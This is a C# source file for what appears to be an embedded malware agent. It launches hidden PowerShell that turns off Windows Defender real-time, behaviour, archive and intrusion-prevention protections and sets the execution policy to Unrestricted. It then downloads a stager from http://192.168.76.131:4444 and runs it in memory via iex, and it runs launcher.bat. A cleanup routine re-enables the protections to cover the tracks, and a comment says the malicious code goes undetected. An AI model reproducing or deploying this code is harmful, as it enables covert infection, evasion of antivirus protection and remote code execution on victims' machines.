using System.Diagnostics;

namespace EmbeddedAgent
{
    internal class AgentProcess
    {
        public static void ExecuteCommands(List<string> commands)
        {
            ProcessStartInfo psi = new ProcessStartInfo();

            psi.CreateNoWindow = true;
            psi.FileName = "powershell.exe";
            psi.WindowStyle = ProcessWindowStyle.Hidden;

            psi.ArgumentList.Add("-Command");

            commands.ForEach(command =>
            {
                psi.ArgumentList.Add(command + ";");
            });

            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.CreateNoWindow = true;

            Process process = new Process();

            process.StartInfo = psi;
            process.Start();

            string output = process.StandardOutput.ReadToEnd();

            process.WaitForExit();
            Console.WriteLine(output);
        }

        public static bool CheckIfLauncherIsAlreadyInstalled()
        {
            return File.Exists(Path.Combine(Directory.GetCurrentDirectory(), "launcher.bat"));
        }

        public static List<string> InitCommands()
        {

            //if (!CheckIfLauncherIsAlreadyInstalled())
            //  commands.Add("Invoke-WebRequest http://192.168.76.131/launcher.bat -OutFile launcher.bat");
            return new List<string>
            {
                $"cd $env:tmp",
                "Set-ExecutionPolicy Unrestricted",
                "Set-MpPreference -DisableRealtimeMonitoring $true",
                "Set-MpPreference -DisableBehaviorMonitoring $true",
                "Set-MpPreference -DisableBlockAtFirstSeen $true",
                "Set-MpPreference -DisableIOAVProtection $true",
                "Set-MpPreference -DisablePrivacyMode $true",
                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true",
                "Set-MpPreference -DisableArchiveScanning $true",
                "Set-MpPreference -DisableIntrusionPreventionSystem $true",
                "(New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;iwr('http://192.168.76.131:4444/download/powershell/Om1hdHRpZmVzdGF0aW9uIGV0dw==') -UseBasicParsing|iex",
                ".\\launcher.bat"
            }; ;
        }
        /*
         * TODO test cases
         * 
         * So now, I know that even after i restart the win defender the malicious code does not detected, but there is one problem,
         * I cant figure out the time i have to wait to run the clean up commands, when waiting after the background worker, but the file launcher.bat always get deleted
         */
        public static List<string> CleanUpCommands()
        {
            //commands.Add("Remove-Item .\\launcher.bat");

            return new List<string>
            {
                "Set-ExecutionPolicy Restricted",
                "Set-MpPreference -DisableRealtimeMonitoring $false",
                "Set-MpPreference -DisableBehaviorMonitoring $false",
                "Set-MpPreference -DisableBlockAtFirstSeen $false",
                "Set-MpPreference -DisableIOAVProtection $false",
                "Set-MpPreference -DisablePrivacyMode $false",
                "Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $false",
                "Set-MpPreference -DisableArchiveScanning $false",
                "Set-MpPreference -DisableIntrusionPreventionSystem $false"
            }; ;
        }
    }
}
